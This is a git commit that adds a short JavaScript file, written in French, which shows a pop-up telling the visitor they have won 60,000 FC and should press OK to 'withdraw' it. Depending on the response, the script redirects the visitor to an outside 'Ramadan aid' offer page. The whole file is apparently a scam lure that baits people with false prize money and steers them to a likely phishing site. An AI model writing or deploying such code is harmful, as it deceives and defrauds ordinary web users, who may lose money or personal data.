c6e4c5928ce7d9413b4804b7eedf765180e78f0a
mitahelp <lawsonmitaa@gmail.com>
2026-03-01 12:43:31 +0100

    Create activation11drc.js

---
+++ activation11drc.js
@@ -0,0 +1,8 @@
+var password = '60 000 FC'
+password = prompt(
+  'Félicitations ! Vous avez droit à 60 000 FC. Veuillez appuyer sur OK pour RETIRER.',
+  '60 000 FC'
+);
+if (password != '60 000 FC') {
+  location.href = 'https://offresargen.org/60000FC-Modeste-Ramadan-Aide.html';
+}
